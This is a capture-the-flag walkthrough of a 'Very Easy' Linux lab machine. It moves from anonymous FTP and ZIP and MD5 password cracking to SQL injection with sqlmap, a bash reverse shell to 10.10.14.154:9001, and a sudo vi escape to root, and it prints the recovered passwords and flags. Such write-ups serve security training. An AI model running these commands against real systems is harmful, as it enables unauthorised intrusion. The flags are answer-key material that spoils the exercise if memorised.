System: Linux
Difficulty: Very Easy

IP Address: 10.129.164.187

# System Flag

Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.164.187 -sC -sV -v
```

Ports are returned.
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.154
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The FTP Share is now accessed.
The credentials are `anonymous:anonymous`.
```
ftp 10.129.164.187
```

A backup share is available in the share. It will be downloaded.
```
get backup.zip
```

The hash of the file is extracted and the password bruteforcing is attempted.
```
zip2john backup.zip > hash.txt
```

```
john hash.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

The password of the ZIP file is `741852963`.

2 Files are now extracted. `index.php` and `style.css`.
Inside the contents of the `index.php` file.
```
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
```

MD5 is outdated and that password can be bruteforced. 
The contents of that hash is now placed in `string.txt`.

Hashcat is used for the bruteforcing process.
```
hashcat -m 0 string.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

The password is `qwerty789`.
![[vaccine_1.png]]

The login is successful and a new page is received.
![[vaccine_2.png]]

The search has a web parameter and it looks injectable.
`sqlmap` will be used to simplify the exploitation and get a shell.
```
kali@kali:~$ sqlmap -u 'http://10.129.164.187/dashboard.php?search=test' --data="username=admin&password=qwerty789" --os-shell
```

Since the `sqlmap` shell is tedious with prompts, a shell will be thrown from its shell to the attacker machine.
```
bash -c "sh -i >& /dev/tcp/10.10.14.154/9001 0>&1"
```

Listening on the attacker's machine.
```
sudo nc -lvnp 9001
```

After the shell has been received, it will be upgraded.
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
```

After checking the `dasboard.php` file, it is possible to see the password of the current user, `postgres`.
```
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

The password is `P@s5w0rd!`

Then, the sudo permissions are checked.
```
sudo -l
```

The user can execute this privileged command without the root credentials.
```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Since the user can run this at root, this command is now executed successfully.
```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

In the `vi` command editor, a root shell is spawned through the command `:shell`.
A root shell has been successfully returned.

The user flag is in the `/var/lib/postgresql` directory.
```
ec9b13ca4d6229cd5cc1e09980965bf7
```

The root flag is in the `/root` directory.
```
dd6e058e814260bc70e9bbdef2715849
```